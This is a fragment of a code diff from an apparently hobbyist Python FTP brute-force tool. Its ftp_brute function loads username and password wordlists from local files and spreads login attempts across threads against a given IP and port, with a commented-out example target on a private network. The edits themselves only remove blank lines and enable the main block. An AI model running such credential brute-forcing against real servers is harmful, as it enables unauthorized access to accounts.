@@ -42,12 +42,9 @@ def ftp_brute(thread_num,ip,port):
     with open(r'C:\Users\dkl\Desktop\uuuu.txt', 'r') as f:
         temp = f.readlines()
     username = [str.rstrip() for str in temp]
-
     with open(r'C:\Users\dkl\Desktop\pppp.txt', 'r') as f:
         temp = f.readlines()
     password = [str.rstrip() for str in temp]
-
-
     times = int(len(username) / thread_num)
     for i in range(thread_num):
         t1 = threading.Thread(target=test, args=(username[i:(i + 1) * times], password,ip,port))
@@ -56,9 +53,9 @@ def ftp_brute(thread_num,ip,port):
     test(username[thread_num * times:], password,ip,port)
     return force_result
 # ftp_brute(2,'192.168.80.130',21)
-# print(force_result)
+# # print(force_result)
 
-# if __name__ == '__main__':
+if __name__ == '__main__':
 
 
 
